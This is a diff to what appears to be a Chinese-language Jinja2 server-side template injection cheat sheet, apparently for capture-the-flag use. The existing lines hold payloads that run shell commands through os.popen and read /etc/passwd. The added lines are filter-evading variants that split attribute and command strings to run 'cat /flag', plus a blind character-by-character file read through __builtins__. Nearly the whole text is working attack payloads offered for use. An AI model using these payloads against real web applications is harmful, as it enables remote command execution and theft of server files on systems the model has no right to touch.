@@ -115,6 +115,12 @@ your input object基类的子类
 {{ config.__class__.__init__.__globals__['os'].popen('ls /').read() }}
 {{lipsum.__globals__.get("os").popen("cd ..;cd ..;cd ..;ls;cat flag.txt").read()}}
 
+{{ }}
+config|attr('__in''it__')|attr('__glo''bals__')|attr('__geti''tem__')('os')|attr('popen')('ca''t /f''lag')|attr('re''ad')()
+
+cycler["__in"+"it__"]["__glo"+"bals__"]  ["__bui"+"ltins__"].__import__('builtins').open('/flag').read(1)[0]=='c'
+
+
 #读取文件与写文件类
 {{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27open%27](%27/etc/passwd%27).read()}}
 #执行命令
